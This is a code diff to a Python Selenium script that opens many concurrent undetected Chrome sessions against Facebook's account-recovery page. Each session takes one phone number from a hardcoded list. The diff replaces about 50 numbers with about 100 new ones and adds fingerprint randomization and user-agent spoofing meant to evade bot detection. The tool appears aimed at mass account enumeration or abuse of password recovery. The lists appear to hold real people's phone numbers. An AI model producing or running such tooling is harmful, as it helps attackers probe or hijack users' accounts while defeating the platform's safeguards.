@@ -1,4 +1,4 @@
-import time, re
+import time
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from threading import Lock
 import undetected_chromedriver as uc
@@ -7,62 +7,114 @@ from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
 from selenium.webdriver.common.keys import Keys
 from libs.FlowList import FlowList
-from utils.clear_cookies import clear_cookies
 from utils.flow_handler import flow_handler
+from utils.fingerprint_randomizer import (
+    get_chrome_options_with_randomization,
+    apply_cdp_anti_fingerprint,
+    get_random_window_size
+)
 
 numbers = """
-243848437177
-243848433312
-243848434049
-243848438681
-243848435333
-243848437345
-243848431876
-243848430218
-243848432767
-243848439834
-243848438791
-243848438277
-243848434417
-243848439094
-243848436759
-243848434476
-243848438618
-243848431469
-243848431310
-243848434438
-243848439577
-243848437218
-243848434011
-243848436935
-243848432839
-243848432690
-243848435831
-243848437086
-243848433516
-243848430806
-243848432135
-243848435168
-243848434262
-243848431995
-243848433762
-243848435351
-243848436642
-243848431079
-243848432788
-243848431626
-243848432872
-243848435688
-243848431639
-243848435547
-243848431856
-243848430960
-243848432787
-243848437781
-243848437707
-243848437006
-243848430464
-243848434449
+2250710945738
+2250710942264
+2250710941832
+2250710948951
+2250710942209
+2250710947020
+2250710949805
+2250710949430
+2250710943531
+2250710946494
+2250710940685
+2250710944943
+2250710945515
+2250710943429
+2250710946147
+2250710941629
+2250710946737
+2250710941343
+2250710948418
+2250710941261
+2250710943361
+2250710947891
+2250710949254
+2250710947190
+2250710947056
+2250710949618
+2250710947121
+2250710941899
+2250710943649
+2250710945621
+2250710941712
+2250710949387
+2250710943245
+2250710945257
+2250710940910
+2250710948543
+2250710946224
+2250710942485
+2250710945823
+2250710949986
+2250710942317
+2250710944052
+2250710943890
+2250710942438
+2250710949634
+2250710946186
+2250710940559
+2250710947949
+2250710944998
+2250710941917
+2250710944830
+2250710941148
+2250710943003
+2250710940460
+2250710941209
+2250710949332
+2250710940840
+2250710943641
+2250710946562
+2250710948790
+2250710949395
+2250710941888
+2250710941609
+2250710940507
+2250710947285
+2250710943287
+2250710946058
+2250710945133
+2250710945615
+2250710947050
+2250710949292
+2250710942702
+2250710944286
+2250710945957
+2250710941534
+2250710944280
+2250710942451
+2250710949411
+2250710941833
+2250710942973
+2250710940400
+2250710942138
+2250710948071
+2250710945894
+2250710948288
+2250710949145
+2250710941989
+2250710943126
+2250710942999
+2250710941345
+2250710948554
+2250710947801
+2250710944506
+2250710942771
+2250710945629
+2250710948194
+2250710946212
+2250710944390
+2250710948916
+2250710941453
 """
 
 numbers = [num.strip() for num in numbers.split('\n') if num.strip()]
@@ -77,7 +129,7 @@ FORGOT_URL = 'https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_
 driver_init_lock = Lock()
 
 
-def process_number(number):
+def agent(number):
     """Process a single phone number in a separate browser session"""
 
     flows = FlowList([
@@ -94,19 +146,43 @@ def process_number(number):
 
     proxy_server = "127.0.0.1:8080"
 
-    options = uc.ChromeOptions()
-    # options.add_argument(f'--proxy-server={proxy_server}')
-    # options.add_argument(f'--headless=new')
-
     driver = None
     result = {"number": number, "status": "unknown", "message": ""}
 
     try:
         # Use lock to prevent race condition during driver initialization
         with driver_init_lock:
+            # Get randomized Chrome options
+            options = uc.ChromeOptions()
+
+            # Apply all anti-fingerprinting Chrome arguments
+            for option in get_chrome_options_with_randomization():
+                options.add_argument(option)
+
+            # Uncomment to use proxy
+            # options.add_argument(f'--proxy-server={proxy_server}')
+            # options.add_argument(f'--headless=new')
+
+            # Additional preferences to prevent fingerprinting
+            prefs = {
+                "credentials_enable_service": False,
+                "profile.password_manager_enabled": False,
+                "profile.default_content_setting_values.notifications": 2,
+                "profile.default_content_setting_values.media_stream": 2,
+                "profile.default_content_setting_values.geolocation": 2,
+            }
+            options.add_experimental_option("prefs", prefs)
+
+
             driver = uc.Chrome(options=options)
-            time.sleep(0.5)  # Small delay to ensure driver is fully initialized
-            driver.set_window_size(1200, 800)
+
+        # Apply CDP-based anti-fingerprinting (must be outside lock for performance)
+        user_agent = apply_cdp_anti_fingerprint(driver)
+        print(f"[{number}] Using UA: {user_agent[:50]}...")
+
+        # Set randomized window size
+        width, height = get_random_window_size()
+        driver.set_window_size(width, height)
 
         wait = WebDriverWait(driver, 9999)
         driver.get(FORGOT_URL)
@@ -221,7 +297,7 @@ def main():
     # Use ThreadPoolExecutor to process numbers concurrently
     with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
         # Submit all tasks
-        future_to_number = {executor.submit(process_number, number): number for number in numbers}
+        future_to_number = {executor.submit(agent, number): number for number in numbers}
 
         # Process results as they complete
         results = []
